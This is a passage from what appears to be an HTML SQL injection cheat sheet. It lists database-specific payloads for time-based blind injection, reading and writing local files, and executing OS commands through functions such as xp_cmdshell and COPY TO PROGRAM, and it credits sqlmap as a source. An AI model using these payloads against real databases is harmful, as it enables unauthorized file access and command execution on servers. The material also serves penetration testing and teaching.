<td>; IF(1=1) WAITFOR DELAY &#x27;0:0:10&#x27;</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>; SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END FROM DUAL</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>; SELECT (CASE WHEN (1=1) THEN (LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))) ELSE 1337 END)</td>
</tr>
</tbody>
</table>

## Reading Local Files

These functions read the contents of local files. The Oracle method can only occur if stacked injections are possible. SQLite&#x27;s readfile is not a core function.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Function</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>LOAD_FILE(&#x27;/path/to/file&#x27;)</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>PG_READ_FILE(&#x27;/path/to/file&#x27;)</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>OPENROWSET(BULK &#x27;C:\path\to\file&#x27;, SINGLE_CLOB)</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>utl_file.get_line(utl_file.fopen(&#x27;/path/to/&#x27;,&#x27;file&#x27;,&#x27;R&#x27;), &lt;buffer&gt;)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>readfile(&#x27;/path/to/file&#x27;)</td>
</tr>
</tbody>
</table>

## Writing Local Files

These statements write content to a local file. The PostgreSQL, MSSQL, and Oracle methods can only occur if stacked injections are possible. MSSQL requires the "Ole Automation Procedures" to be enabled.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Statement</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>SELECT &#x27;contents&#x27; INTO OUTFILE &#x27;/path/to/file&#x27;</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>COPY (SELECT &#x27;contents&#x27;) TO &#x27;/path/to/file&#x27;</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>execute spWriteStringToFile &#x27;contents&#x27;, &#x27;C:\path\to\&#x27;, &#x27;file&#x27;</td>
</tr>
<tr>
<td class="span">Oracle</td>
<td>utl_file.put_line(utl_file.fopen(&#x27;/path/to/&#x27;,&#x27;file&#x27;,&#x27;R&#x27;), &lt;buffer&gt;)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>SELECT writefile(&#x27;/path/to/file&#x27;, column_name) FROM table_name</td>
</tr>
</tbody>
</table>

## Executing OS Commands

These statements execute local OS commands. The PostgreSQL, MSSQL, and 2nd Oracle methods can only occur if stacked injections are possible. The 1st Oracle method requires the OS_Command package.

<table>
<thead>
<tr>
<th>Variant</th>
<th>Statement</th>
</tr>
</thead>
<tbody>
<tr>
<td class="span">MySQL</td>
<td>Not Possible</td>
</tr>
<tr>
<td class="span">PostgreSQL</td>
<td>COPY (SELECT &#x27;&#x27;) to program &#x27;&lt;command&gt;&#x27;</td>
</tr>
<tr>
<td class="span">MSSQL</td>
<td>EXEC xp_cmdshell &#x27;&lt;command&gt;&#x27;</td>
</tr>
<tr>
<td rowspan="2" class="span">Oracle</td>
<td>select os_command.exec_clob(&#x27;&lt;command&gt;&#x27;) cmd from dual</td>
</tr>
<tr>
<td>DBMS_SCHEDULER.CREATE_JOB (job_name => &#x27;exec&#x27;, job_type => &#x27;EXECUTABLE&#x27;, job_action => &#x27;&lt;command&gt;&#x27;, enabled => TRUE)</td>
</tr>
<tr>
<td class="span">SQLite</td>
<td>Not Possible</td>
</tr>
</tbody>
</table>

## References

The vast majority of the information comprised here came from my own research / experimentation with various injections and database variants. However several payloads were either taken from, or based on those found in the popular SQL injection tool <a href="https://sqlmap.org/">SQLmap</a>.

<script>$(".toggle").click(function() {$(this).parent().children("div").toggle("fast", function(){});});</script>